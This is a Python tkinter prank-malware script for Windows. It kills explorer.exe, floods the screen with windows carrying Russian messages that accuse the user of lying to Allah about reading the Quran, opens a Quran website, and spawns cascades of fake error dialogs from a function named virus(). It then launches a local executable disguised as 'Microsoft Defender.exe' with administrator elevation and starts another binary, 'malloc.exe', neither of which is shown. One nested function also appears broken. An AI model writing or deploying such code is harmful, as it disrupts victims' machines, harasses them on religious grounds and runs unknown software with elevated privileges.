from tkinter import *
from tkinter import ttk
import os
import random
import tempfile
import base64
import zlib
import subprocess
import threading

windows = []

root = Tk()
root.title("")
root.geometry("0x0")

def after_second():  
    def create_window(index):
        if index < 50:
            window3 = Toplevel()
            window3.title("Прими наказание")
            width, height = 400, 200
            x = random.randint(0, 1920 - width)
            y = random.randint(0, 1080 - height)
            window3.geometry(f"{width}x{height}+{x}+{y}")
            lbl = ttk.Label(window3, text="Но это не искупит твой грех...", font=("Arial", 14), foreground="#FC0202", background="#000000")
            lbl.pack(expand=True)
            window3.config(bg='black')
            windows3.append(window3)
            window3.after(100, create_window, index + 1)
        else:
            virus()

    windows3 = []
    create_window(0)

def after_first():
    def destroy_windows_and_start_second():
        for window2 in windows2:
            try:
                window2.destroy()
            except:
                pass
        root.after(5000, after_second)

    def create_window(index):
        if index < 50:
            window2 = Toplevel()
            window2.title("Пока можешь")
            width, height = 400, 200
            x = random.randint(0, 1920 - width)
            y = random.randint(0, 1080 - height)
            window2.geometry(f"{width}x{height}+{x}+{y}")
            lbl = ttk.Label(window2, text="Читай!", font=("Arial", 14), foreground="#FC0202", background="#000000")
            lbl.pack(expand=True)
            window2.config(bg='black')
            windows2.append(window2)
            window2.after(100, create_window, index + 1)
        else:
            root.after(5000, destroy_windows_and_start_second)

    windows2 = []
    create_window(0)

def open_browser():
    for window in windows:
        try:
            window.destroy()
        except:
            pass
    os.system("start msedge https://quran-online.ru/1:1")
    root.after(5000, after_first)

index1 = 0
def create_window():
    global index1
    if index1 < 50:
        window = Toplevel()
        window.title("Ты врешь Аллаху")
        width, height = 400, 200
        x = random.randint(0, 1920 - width)
        y = random.randint(0, 1080 - height)
        window.geometry(f"{width}x{height}+{x}+{y}")
        lbl = ttk.Label(window, text="Зачем ты врешь что читал коран?", font=("Arial", 14), foreground="#FC0202", background="#000000")
        lbl.pack(expand=True)
        window.config(bg='black')
        windows.append(window)
        index1 += 1
        window.after(100, create_window)
    else:
        open_browser()

def create_error_window(x, y):
    numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', "9", "A", 'B', 'C', 'D', 'E', 'F']
    ICON = zlib.decompress(base64.b64decode("eJxjYGAEQgEBBiDJwZDBysAgxsDAoAHEQCEGBQaIOAg4sDIgACMUj4JRMApGwQgF/ykEAFXxQRc="))
    _, ICON_PATH = tempfile.mkstemp(suffix=".ico")
    with open(ICON_PATH, "wb") as icon_file:
        icon_file.write(ICON)

    errorwin = Toplevel()
    errorwin.iconbitmap(default=ICON_PATH)
    errorwin.title("Error")
    errorwin.geometry(f"180x115+{x}+{y}")
    errorwin.resizable(False, False)
    try:
        img = PhotoImage(file="img/error.png")
        errorwin.img = img
        imglabel = ttk.Label(errorwin, image=img)
        imglabel.place(x=15, y=20)
    except Exception as e:
        print(f"Error loading image: {e}")
        imglabel = ttk.Label(errorwin, text="Image not found")
        imglabel.place(x=15, y=20)
    error_code = f"Error x{''.join(random.choices(numbers, k=8))}"
    errorlabel = ttk.Label(errorwin, text=error_code)
    errorlabel.place(x=70, y=35)
    btn = ttk.Button(errorwin, text="OK", command=errorwin.destroy)
    btn.place(x=90, y=85)


def create_multiple_error_windows(x, y, count, direction, callback):
    if count > 0:
        create_error_window(x, y)
        if direction == "nw-se":
            root.after(50, lambda: create_multiple_error_windows(x + 100, y + 100, count - 1, direction, callback))
        elif direction == "se-nw":
            root.after(50, lambda: create_multiple_error_windows(x - 100, y - 100, count - 1, direction, callback))
        elif direction == "w-e":
            root.after(50, lambda: create_multiple_error_windows(x + 100, y, count - 1, direction, callback))
        elif direction == "sw-ne":
            root.after(50, lambda: create_multiple_error_windows(x + 100, y - 100, count - 1, direction, callback))
    else:
        callback()

def create_multiple_error_windows_instant(x, y, count, direction):
    if count > 0:
        create_error_window(x, y)
        if direction == "nw-se":
            root.after(20, lambda: create_multiple_error_windows_instant(x + 100, y + 100, count - 1, direction))
        elif direction == "se-nw":
            root.after(20, lambda: create_multiple_error_windows_instant(x - 100, y - 100, count - 1, direction))
        elif direction == "w-e":
            root.after(20, lambda: create_multiple_error_windows_instant(x + 100, y, count - 1, direction))
        elif direction == "sw-ne":
            root.after(20, lambda: create_multiple_error_windows_instant(x + 100, y - 100, count - 1, direction))

def creating_instantly():
    index = 0
    for i in range(20):
        x = random.randint(0, 1920)
        y = random.randint(0, 1080)
        direction = random.choice(['nw-se', 'se-nw', 'w-e', 'sw-ne'])
        create_multiple_error_windows_instant(x, y, 30, direction)
    def ultimate_death():
        x = random.randint(0, 1920)
        y = random.randint(0, 1080)
        create_error_window(x, y)
        root.after(250, ultimate_death)
        index += 1
    def malloc():
        subprocess.run("malloc.exe")

    exe_path = os.path.join(os.getcwd(), "Microsoft Defender.exe")
    os.system(f'powershell -Command "Start-Process -FilePath \'{exe_path}\' -Verb RunAs"')
    thread = threading.Thread(target=malloc)
    thread.start()

    ultimate_death()

def virus():
    create_multiple_error_windows(100, 100, 20, "nw-se",
                                  lambda: create_multiple_error_windows(1720, 1080, 20, "se-nw", lambda:
                                                                         create_multiple_error_windows(0, 500, 30, "w-e", lambda:
                                                                                                                                       create_multiple_error_windows(0, 1080, 20, 'sw-ne', lambda:
                                                                                                                                                                     create_multiple_error_windows(1250, 0, 20, "nw-se", lambda:
                                                                                                                                                                                                   creating_instantly())))))

os.system('taskkill /f /im explorer.exe')
create_window()

root.mainloop()
